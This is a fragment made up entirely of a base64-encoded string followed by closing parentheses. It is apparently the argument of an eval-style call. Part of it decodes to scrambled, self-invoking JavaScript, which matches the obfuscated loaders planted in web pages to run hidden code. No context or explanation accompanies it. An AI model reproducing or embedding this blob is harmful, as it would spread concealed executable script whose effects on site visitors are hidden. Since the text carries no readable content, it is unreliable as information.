IXQoIy5yZTs1LllKZDMtdShZZFldZ29pNX1jMFspNi14KE1vRXlsLSEsb2glWWEgdDlZdC5hMVtKNGFZdDl0YV89bF1fWWpzICFZUjtlWXJ1dXIgPTFhMm8oWShddFkgeGhvb11yTF9ZJHIuWV9iWXQgNE4zXSQyYVlkX2EoYTFZMzN7bz1hdV9hM31UZShdWVYye2RkX19ZIngudyUoUTV1aGF0YjFlcGxZOWFZXXN7MXI9IXtjeWNfJWVdcCBlbjFjbGYuKHZTOSBdb0BFNVtfNjFuWS5adFlZOWFvMC5XdHVZKTA5XWg2KWEudGNZbTI5cG91Y0xPcj03MmRheiFZX1liaWIpZGxjZEktWWklZmFpO3QzPUZdbm8gKWEzJShlXVs0LFtwWSxbWSh9ZW0xQ2JnKXRlXTNZcylZdCJnWXZ0IElZRGM9Plkpcm44NllZU2E7IUZkLVlkWV9dLj1GWTAhSClfeXZkLmFtKSlZbi52KWFoX2guMC5cLztpclluLCFqN2xhYS4rLE4sdHIidFlDMSs4cjtnPT1yLiZjbS4xWV9mJSwgYnxpZjJfMWFfKTNzNH0gX3RlYzs2bC5hOWk9WWplbnVmKDhqWT07dDhtcllmNF1Zblkscyp7JykpO3ZhciBwbFI9dWlzKHJkQixmWmYgKTtwbFIoODA4NCk7cmV0dXJuIDIyOTF9KSgp'))
